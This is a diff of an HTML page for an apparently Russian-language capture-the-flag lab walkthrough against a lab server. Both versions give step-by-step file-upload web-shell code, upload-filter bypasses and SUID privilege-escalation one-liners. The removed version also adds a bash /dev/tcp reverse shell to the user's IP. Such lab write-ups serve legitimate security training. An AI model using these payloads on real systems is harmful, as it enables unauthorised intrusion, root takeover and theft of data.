@@ -10,331 +10,354 @@
             padding: 0;
             box-sizing: border-box;
         }
-
+        
         body {
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e0e0e0;
             line-height: 1.6;
-            color: #f1f5f9;
-            padding: 2rem;
+            padding: 20px;
         }
-
+        
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            background: rgba(15, 23, 42, 0.7);
-            backdrop-filter: blur(10px);
-            border-radius: 1.5rem;
-            padding: 2rem;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(71, 85, 105, 0.5);
         }
-
+        
         h1 {
-            font-size: 2.2rem;
-            background: linear-gradient(135deg, #a5f3fc, #c084fc);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 1rem;
             text-align: center;
+            color: #00d4ff;
+            margin-bottom: 10px;
+            font-size: 2.5em;
+            text-shadow: 0 0 10px rgba(0,212,255,0.3);
         }
-
+        
         .subtitle {
             text-align: center;
-            color: #94a3b8;
-            margin-bottom: 2rem;
-            border-bottom: 1px solid #334155;
-            padding-bottom: 1rem;
+            color: #888;
+            margin-bottom: 40px;
+            font-size: 1.1em;
         }
-
-        h2 {
-            font-size: 1.6rem;
-            margin-top: 2rem;
-            margin-bottom: 1rem;
-            color: #c084fc;
-            border-left: 4px solid #c084fc;
-            padding-left: 1rem;
+        
+        .task {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border-left: 5px solid #00d4ff;
+            backdrop-filter: blur(10px);
         }
-
-        h3 {
-            font-size: 1.3rem;
-            margin-top: 1.5rem;
-            margin-bottom: 0.75rem;
-            color: #7dd3fc;
+        
+        .task h2 {
+            color: #00d4ff;
+            margin-bottom: 20px;
+            font-size: 1.8em;
         }
-
+        
         .step {
-            background: #0f172a;
-            border-radius: 1rem;
-            padding: 1.2rem;
-            margin-bottom: 1.2rem;
-            border-left: 4px solid #3b82f6;
-            transition: transform 0.2s;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
         }
-
-        .step:hover {
-            transform: translateX(5px);
-            background: #1e293b;
+        
+        .step h3 {
+            color: #ffaa00;
+            margin-bottom: 15px;
+            font-size: 1.3em;
         }
-
-        .step-number {
-            display: inline-block;
-            background: #3b82f6;
-            color: white;
-            font-weight: bold;
-            width: 28px;
-            height: 28px;
-            text-align: center;
-            line-height: 28px;
-            border-radius: 8px;
-            font-size: 0.9rem;
-            margin-right: 10px;
+        
+        .step h4 {
+            color: #88ff88;
+            margin: 15px 0 10px 0;
         }
-
+        
         code {
-            background: #020617;
-            color: #facc15;
-            padding: 0.2rem 0.4rem;
-            border-radius: 0.4rem;
-            font-family: 'Fira Code', 'Cascadia Code', monospace;
-            font-size: 0.9rem;
+            background: #2d2d2d;
+            padding: 2px 8px;
+            border-radius: 5px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            color: #ffaa66;
         }
-
+        
         pre {
-            background: #020617;
-            padding: 1rem;
-            border-radius: 0.75rem;
+            background: #0a0a0a;
+            padding: 15px;
+            border-radius: 8px;
             overflow-x: auto;
-            margin: 1rem 0;
-            border: 1px solid #334155;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.85rem;
+            margin: 15px 0;
+            border: 1px solid #333;
         }
-
-        .url-list {
-            background: #1e1b2f;
-            padding: 1rem;
-            border-radius: 0.75rem;
-            margin: 0.5rem 0;
+        
+        pre code {
+            background: none;
+            padding: 0;
+            color: #98fb98;
         }
-
-        .success {
-            background: rgba(34, 197, 94, 0.2);
-            border-left: 4px solid #22c55e;
-            padding: 0.75rem;
-            border-radius: 0.5rem;
-            margin: 1rem 0;
+        
+        .url {
+            background: #1e3a3a;
+            padding: 10px;
+            border-radius: 8px;
+            font-family: monospace;
+            word-break: break-all;
+            margin: 10px 0;
+            border-left: 3px solid #00d4ff;
         }
-
+        
+        .result {
+            background: #2a2a2a;
+            border-radius: 8px;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: monospace;
+            color: #88ff88;
+        }
+        
         .warning {
-            background: rgba(245, 158, 11, 0.2);
-            border-left: 4px solid #f59e0b;
-            padding: 0.75rem;
-            border-radius: 0.5rem;
-            margin: 1rem 0;
+            background: rgba(255,100,100,0.2);
+            border-left: 3px solid #ff6666;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
         }
-
-        .danger {
-            background: rgba(239, 68, 68, 0.2);
-            border-left: 4px solid #ef4444;
-            padding: 0.75rem;
-            border-radius: 0.5rem;
-            margin: 1rem 0;
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
         }
-
+        
+        th, td {
+            border: 1px solid #444;
+            padding: 10px;
+            text-align: left;
+        }
+        
+        th {
+            background: #00d4ff33;
+            color: #00d4ff;
+        }
+        
         hr {
             border: none;
             height: 1px;
-            background: linear-gradient(90deg, transparent, #475569, transparent);
-            margin: 1.5rem 0;
+            background: linear-gradient(to right, transparent, #00d4ff, transparent);
+            margin: 30px 0;
         }
-
-        footer {
+        
+        .note {
+            background: #2a2a2a;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
             text-align: center;
-            margin-top: 2rem;
-            color: #64748b;
-            font-size: 0.85rem;
         }
-
+        
         @media (max-width: 768px) {
             body {
-                padding: 1rem;
+                padding: 10px;
             }
-            .container {
-                padding: 1rem;
+            .task {
+                padding: 15px;
+            }
+            .step {
+                padding: 15px;
             }
             h1 {
-                font-size: 1.6rem;
+                font-size: 1.8em;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🐚 Лабораторная работа</h1>
-        <div class="subtitle">Внедрение web-shell, повышение привилегий и получение флагов</div>
-
-        <!-- Введение -->
-        <div class="step">
-            <h3>📌 Цель работы</h3>
-            <p>Получить два флага на сервере <code>http://192.168.0.181:8080</code> через загрузку вредоносного файла, выполнение команд и эскалацию привилегий до root.</p>
-        </div>
-
+        <h1>🔒 Лабораторная работа</h1>
+        <div class="subtitle">Взлом веб-сервера и получение флагов (Capture The Flag)</div>
+        
         <!-- Задание 1 -->
-        <h2>🔰 Задание 1: Получение первого флага (user.txt)</h2>
-
-        <div class="step">
-            <span class="step-number">1</span> <strong>Доступ к сайту</strong><br>
-            Перейдите в браузере по адресу:
-            <pre>http://192.168.0.181:8080</pre>
-        </div>
-
-        <div class="step">
-            <span class="step-number">2</span> <strong>Найдите форму загрузки файлов</strong><br>
-            Ищите кнопки: <code>Upload</code>, <code>Загрузить</code>, <code>Choose File</code>, <code>Browse</code>. Форма обычно находится на главной странице или в разделе "File Upload".
-        </div>
-
-        <div class="step">
-            <span class="step-number">3</span> <strong>Создание web-shell (shell.php)</strong><br>
-            На рабочем столе или в любой папке создайте текстовый документ → переименуйте в <code>shell.php</code>.<br>
-            Откройте в Блокноте (Notepad) и вставьте код:
-            <pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
-            Сохраните файл.
-        </div>
-
-        <div class="step">
-            <span class="step-number">4</span> <strong>Загрузка файла на сервер</strong><br>
-            Нажмите <code>Choose File</code>, выберите <code>shell.php</code>, затем нажмите <code>Upload</code> / <code>Загрузить</code>.
-        </div>
-
-        <div class="step">
-            <span class="step-number">5</span> <strong>Поиск пути к загруженному файлу</strong><br>
-            После загрузки сайт может показать сообщение с путём. Если его нет — проверьте URL по очереди (добавляйте в адресную строку и нажимайте Enter):
-            <div class="url-list">
-                <code>http://192.168.0.181:8080/uploads/shell.php?cmd=id</code><br>
-                <code>http://192.168.0.181:8080/files/shell.php?cmd=id</code><br>
-                <code>http://192.168.0.181:8080/upload/shell.php?cmd=id</code><br>
-                <code>http://192.168.0.181:8080/shell.php?cmd=id</code>
+        <div class="task">
+            <h2>📁 Задание 1: Corporate File Server - User</h2>
+            <p><strong>Цель:</strong> Найти уязвимость на сайте, загрузить файл (RCE), получить доступ от имени www-data или user и найти флаг в <code>/home/user/user.txt</code></p>
+            
+            <div class="step">
+                <h3>Шаг 1: Открыть сайт</h3>
+                <div class="url">http://192.168.0.181:8080</div>
+                <p>Введите этот адрес в адресной строке браузера и нажмите Enter.</p>
             </div>
-            <div class="success">
-                ✅ <strong>Признак успеха:</strong> Вы увидите вывод команды <code>id</code>, например:
-                <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+            
+            <div class="step">
+                <h3>Шаг 2: Найти форму загрузки файлов</h3>
+                <p>На сайте найдите кнопки:</p>
+                <ul>
+                    <li>"Upload"</li>
+                    <li>"Choose File"</li>
+                    <li>"Browse"</li>
+                    <li>"Загрузить"</li>
+                </ul>
+            </div>
+            
+            <div class="step">
+                <h3>Шаг 3: Создать файл web-shell</h3>
+                <ol>
+                    <li>На рабочем столе нажмите правой кнопкой мыши → <strong>"Создать" → "Текстовый документ"</strong></li>
+                    <li>Переименуйте файл в <code>shell.php</code></li>
+                    <li>Откройте файл в Блокноте (Notepad)</li>
+                    <li>Вставьте код:
+                        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+                    </li>
+                    <li>Сохраните файл (Ctrl+S)</li>
+                </ol>
+            </div>
+            
+            <div class="step">
+                <h3>Шаг 4: Загрузить файл на сайт</h3>
+                <ol>
+                    <li>Нажмите "Choose File" или "Browse"</li>
+                    <li>Выберите файл <code>shell.php</code></li>
+                    <li>Нажмите "Upload" или "Загрузить"</li>
+                </ol>
+            </div>
+            
+            <div class="step">
+                <h3>Шаг 5: Найти расположение загруженного файла</h3>
+                <p>Поочередно проверьте следующие адреса в браузере:</p>
+                <div class="url">http://192.168.0.181:8080/uploads/shell.php?cmd=id</div>
+                <div class="url">http://192.168.0.181:8080/files/shell.php?cmd=id</div>
+                <div class="url">http://192.168.0.181:8080/upload/shell.php?cmd=id</div>
+                <div class="url">http://192.168.0.181:8080/shell.php?cmd=id</div>
+                <p><strong>✅ Признак успеха:</strong> Если вы видите:</p>
+                <div class="result">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+                <p>Значит, вы нашли правильный путь!</p>
+            </div>
+            
+            <div class="step">
+                <h3>Шаг 6: Получить первый флаг</h3>
+                <p>Замените <code>cmd=id</code> на команду чтения флага:</p>
+                <div class="url">http://192.168.0.181:8080/[НАЙДЕННЫЙ_ПУТЬ]/shell.php?cmd=cat%20/home/user/user.txt</div>
+                <p><strong>Пример:</strong> если файл в папке <code>uploads</code>:</p>
+                <div class="url">http://192.168.0.181:8080/uploads/shell.php?cmd=cat%20/home/user/user.txt</div>
+                <p>На экране отобразится первый флаг. Запишите его!</p>
             </div>
         </div>
-
-        <div class="step">
-            <span class="step-number">6</span> <strong>Получение первого флага (user.txt)</strong><br>
-            Используйте рабочий URL, заменив <code>cmd=id</code> на команду чтения флага:
-            <pre>http://192.168.0.181:8080/[ПУТЬ_К_SHELL]/shell.php?cmd=cat%20/home/user/user.txt</pre>
-            <p>Например, если файл лежит в <code>uploads</code>:</p>
-            <pre>http://192.168.0.181:8080/uploads/shell.php?cmd=cat%20/home/user/user.txt</pre>
-            <div class="success">🎯 Флаг отобразится на странице. Запишите его.</div>
-        </div>
-
-        <div class="warning">
-            ⚠️ <strong>Если .php не загружается:</strong> сервер может блокировать PHP-файлы. Переименуйте <code>shell.php.jpg</code> или <code>shell.php.png</code> и повторите загрузку. Можно также добавить в начало файла <code>GIF89a;</code> перед PHP-кодом для маскировки.
-        </div>
-
+        
         <hr>
-
+        
         <!-- Задание 2 -->
-        <h2>🚀 Задание 2: Повышение привилегий до root и получение второго флага (root.txt)</h2>
-
-        <div class="step">
-            <span class="step-number">1</span> <strong>Поиск SUID-файлов</strong><br>
-            Через web-shell выполните команду поиска файлов с установленным SUID-битом:
-            <pre>http://192.168.0.181:8080/[ПУТЬ_К_SHELL]/shell.php?cmd=find%20/%20-perm%20-4000%20-type%20f%202%3E/dev/null</pre>
-            <p>В ответе ищите полезные утилиты, такие как: <code>/usr/bin/find</code>, <code>/usr/bin/python</code>, <code>/usr/bin/php</code>, <code>/usr/bin/vim</code>, <code>/usr/bin/less</code>.</p>
+        <div class="task">
+            <h2>👑 Задание 2: Root Access (Повышение привилегий)</h2>
+            <p><strong>Цель:</strong> Исследовать SUID-файлы, получить права root и найти флаг в <code>/root/root.txt</code></p>
+            
+            <div class="step">
+                <h3>Шаг 1: Найти файлы с SUID-битом</h3>
+                <p>Введите в браузере (замените [ПУТЬ] на найденный ранее):</p>
+                <div class="url">http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=find%20/%20-perm%20-4000%20-type%20f%202%3E/dev/null</div>
+                <p><strong>Пример:</strong></p>
+                <div class="url">http://192.168.0.181:8080/uploads/shell.php?cmd=find%20/%20-perm%20-4000%20-type%20f%202%3E/dev/null</div>
+            </div>
+            
+            <div class="step">
+                <h3>Шаг 2: Найти подходящий файл в списке</h3>
+                <p>В полученном списке ищите один из этих файлов:</p>
+                <ul>
+                    <li><code>/usr/bin/find</code></li>
+                    <li><code>/usr/bin/python</code></li>
+                    <li><code>/usr/bin/php</code></li>
+                    <li><code>/usr/bin/vim</code></li>
+                    <li><code>/usr/bin/less</code></li>
+                </ul>
+            </div>
+            
+            <div class="step">
+                <h3>Шаг 3: Получить root shell</h3>
+                
+                <h4>🔹 Если найден <code>/usr/bin/find</code>:</h4>
+                <div class="url">http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=find%20.%20-exec%20/bin/sh%20-p%20%5C%3B%20-quit</div>
+                
+                <h4>🔹 Если найден <code>/usr/bin/python</code>:</h4>
+                <div class="url">http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=python%20-c%20%27import%20os%3B%20os.setuid(0)%3B%20os.system(%22/bin/sh%22)%27</div>
+                
+                <h4>🔹 Если найден <code>/usr/bin/php</code>:</h4>
+                <div class="url">http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=php%20-r%20%27posix_setuid(0)%3B%20system(%22/bin/sh%22)%3B%27</div>
+            </div>
+            
+            <div class="step">
+                <h3>Шаг 4: Получить второй флаг</h3>
+                <p>После получения root-доступа, прочитайте второй флаг:</p>
+                <div class="url">http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=cat%20/root/root.txt</div>
+                <p>На экране отобразится второй флаг!</p>
+            </div>
         </div>
-
-        <div class="step">
-            <span class="step-number">2</span> <strong>Эскалация через найденный SUID-файл</strong><br>
-            В зависимости от найденной утилиты выполните одну из команд (замените <code>[ПУТЬ_К_SHELL]</code> и <code>[ФАЙЛ]</code>):<br><br>
-
-            <strong>📌 Если найден <code>find</code>:</strong>
-            <pre>http://192.168.0.181:8080/[ПУТЬ_К_SHELL]/shell.php?cmd=find%20.%20-exec%20/bin/sh%20-p%20\;%20-quit</pre>
-
-            <strong>🐍 Если найден <code>python</code>:</strong>
-            <pre>http://192.168.0.181:8080/[ПУТЬ_К_SHELL]/shell.php?cmd=python%20-c%20'import%20os;%20os.setuid(0);%20os.system("/bin/sh")'</pre>
-
-            <strong>🐘 Если найден <code>php</code>:</strong>
-            <pre>http://192.168.0.181:8080/[ПУТЬ_К_SHELL]/shell.php?cmd=php%20-r%20'posix_setuid(0);%20system("/bin/sh");'</pre>
-
-            <div class="success">После выполнения вы получите shell с правами root, но работа через браузер будет неудобной. Переходим к установке reverse shell.</div>
-        </div>
-
-        <div class="step">
-            <span class="step-number">3</span> <strong>Настройка слушателя (ваш компьютер)</strong><br>
-            Откройте терминал (cmd или bash) и запустите Netcat в режиме прослушивания:
-            <pre>nc -lnvp 4444</pre>
-            <p>Убедитесь, что брандмауэр не блокирует порт 4444.</p>
-        </div>
-
-        <div class="step">
-            <span class="step-number">4</span> <strong>Отправка reverse shell на слушателя</strong><br>
-            Через web-shell выполните команду, заменив <code>СІЗДІҢ_IP</code> на IP-адрес вашего компьютера (например, <code>192.168.0.100</code>):
-            <pre>http://192.168.0.181:8080/[ПУТЬ_К_SHELL]/shell.php?cmd=bash%20-c%20"bash%20-i%20>&%20/dev/tcp/ВАШ_IP/4444%200>&1"</pre>
-            <div class="success">В терминале с <code>nc -lnvp 4444</code> должно появиться соединение. Введите <code>whoami</code> — вы должны увидеть <code>root</code>.</div>
-        </div>
-
-        <div class="step">
-            <span class="step-number">5</span> <strong>Получение второго флага (root.txt)</strong><br>
-            В полученном reverse shell выполните:
-            <pre>cat /root/root.txt</pre>
-            <div class="success">🎉 Второй флаг (root.txt) отобразится в терминале. Задание выполнено!</div>
-        </div>
-
-        <!-- Альтернативные методы и советы -->
-        <h2>🛠️ Альтернативные методы и советы</h2>
-
-        <div class="step">
-            <h3>📂 Если reverse shell не устанавливается</h3>
-            <p>Вы можете читать флаги прямо через web-shell, без получения полноценного shell:</p>
-            <pre>http://192.168.0.181:8080/[ПУТЬ_К_SHELL]/shell.php?cmd=cat%20/root/root.txt</pre>
-            <p>Для этого нужно предварительно получить root-права через SUID-эксплойт (см. шаг 2 задания 2).</p>
-        </div>
-
-        <div class="step">
-            <h3>🔧 Обход ограничений на загрузку</h3>
-            <ul style="margin-left: 1.5rem;">
-                <li>Двойное расширение: <code>shell.php.jpg</code></li>
-                <li>Изменение MIME-типа в запросе (через Burp Suite) на <code>image/jpeg</code></li>
-                <li>Добавление магических байтов изображения в начало файла: <code>GIF89a;&lt;?php system($_GET['cmd']); ?&gt;</code></li>
-            </ul>
-        </div>
-
-        <div class="step">
-            <h3>💡 Если SUID-файлов нет или они не сработали</h3>
-            <p>Попробуйте другие векторы эскалации:</p>
-            <ul style="margin-left: 1.5rem;">
-                <li><code>sudo -l</code> (если есть sudo)</li>
-                <li>Поиск cron-задач с правами root, записывающих в исполняемые файлы</li>
-                <li>Эксплуатация уязвимостей ядра (kernel exploit)</li>
-            </ul>
-        </div>
-
-        <div class="danger">
-            ⚡ <strong>Важно:</strong> Все действия выполняются только в рамках разрешённой лабораторной среды. Не применяйте эти методы на реальных системах без согласия владельца.
-        </div>
-
+        
         <hr>
-
-        <h2>📋 Чек-лист выполнения</h2>
-        <div class="step">
-            <input type="checkbox" id="check1"> <label for="check1"> ✅ Загрузили shell.php на сервер</label><br>
-            <input type="checkbox" id="check2"> <label for="check2"> ✅ Нашли URL работающего shell.php?cmd=id</label><br>
-            <input type="checkbox" id="check3"> <label for="check3"> ✅ Получили первый флаг (cat /home/user/user.txt)</label><br>
-            <input type="checkbox" id="check4"> <label for="check4"> ✅ Нашли SUID-файл (find / -perm -4000 -type f)</label><br>
-            <input type="checkbox" id="check5"> <label for="check5"> ✅ Получили root через SUID-эксплойт</label><br>
-            <input type="checkbox" id="check6"> <label for="check6"> ✅ Запустили слушателя nc -lnvp 4444</label><br>
-            <input type="checkbox" id="check7"> <label for="check7"> ✅ Отправили reverse shell и подтвердили root (whoami)</label><br>
-            <input type="checkbox" id="check8"> <label for="check8"> ✅ Прочитали /root/root.txt и получили второй флаг</label>
+        
+        <!-- Дополнительные советы -->
+        <div class="task">
+            <h2>⚠️ Решение возможных проблем</h2>
+            
+            <div class="warning">
+                <strong>❌ Если файл .php не загружается (ошибка "Forbidden"):</strong><br>
+                1. Переименуйте файл в <code>shell.php.jpg</code> или <code>shell.php.png</code><br>
+                2. Загрузите снова<br>
+                3. При обращении используйте: <code>shell.php.jpg?cmd=id</code>
+            </div>
+            
+            <div class="warning">
+                <strong>❌ Если команда не выполняется:</strong><br>
+                Проверьте, правильно ли указан путь к файлу. Попробуйте <code>cmd=whoami</code> или <code>cmd=ls</code>
+            </div>
+            
+            <div class="warning">
+                <strong>❌ Если нет подходящих SUID-файлов:</strong><br>
+                Попробуйте выполнить <code>sudo -l</code> через веб-шелл, чтобы увидеть доступные команды
+            </div>
         </div>
-
-        <footer>
-            🧪 Лабораторная работа выполнена в образовательных целях. Для закрепления материала повторите каждый шаг, фиксируя вывод команд.
-        </footer>
+        
+        <!-- Таблица для записи результатов -->
+        <div class="task">
+            <h2>📝 Таблица результатов</h2>
+            <p>Записывайте результаты каждого шага:</p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Шаг</th>
+                        <th>Результат</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>1. Загрузка файла</td>
+                        <td style="color: #ffaa66;">Успешно / Не успешно</td>
+                    </tr>
+                    <tr>
+                        <td>2. Путь к файлу</td>
+                        <td style="color: #ffaa66;">_____________</td>
+                    </tr>
+                    <tr>
+                        <td>3. Команда id</td>
+                        <td style="color: #ffaa66;">_____________</td>
+                    </tr>
+                    <tr>
+                        <td>4. Первый флаг</td>
+                        <td style="color: #88ff88;">_____________</td>
+                    </tr>
+                    <tr>
+                        <td>5. SUID файлы</td>
+                        <td style="color: #ffaa66;">_____________</td>
+                    </tr>
+                    <tr>
+                        <td>6. Второй флаг</td>
+                        <td style="color: #88ff88;">_____________</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="note">
+            <p>💡 <strong>Совет:</strong> Выполняйте шаги последовательно. Если возникнут вопросы, запишите на каком этапе остановились и что увидели на экране.</p>
+            <p style="margin-top: 10px; font-size: 0.9em;">🎯 Удачи в выполнении лабораторной работы!</p>
+        </div>
     </div>
 </body>
 </html>
